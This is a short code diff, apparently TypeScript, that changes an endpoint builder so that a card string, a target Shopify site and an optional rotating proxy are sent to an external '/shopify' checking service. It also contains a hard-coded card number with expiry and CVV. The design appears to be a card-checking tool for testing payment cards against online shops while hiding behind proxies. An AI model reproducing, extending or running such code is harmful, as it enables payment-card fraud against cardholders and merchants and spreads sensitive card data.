@@ -9718,10 +9718,12 @@ ${resultsDisplay || "Waiting for results..."}
         return `${randomProxy.ip}:${randomProxy.port}`;
       };
 
-      // Two API endpoints for checking sites
+      // API endpoint for checking sites — proxy is OPTIONAL (direct call when empty)
       const API_ENDPOINTS = [
-        (site: string, cc: string, proxy: string) => 
-          `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}&proxy=${proxy}`,
+        (site: string, cc: string, proxy: string) =>
+          proxy
+            ? `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}&proxy=${proxy}`
+            : `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
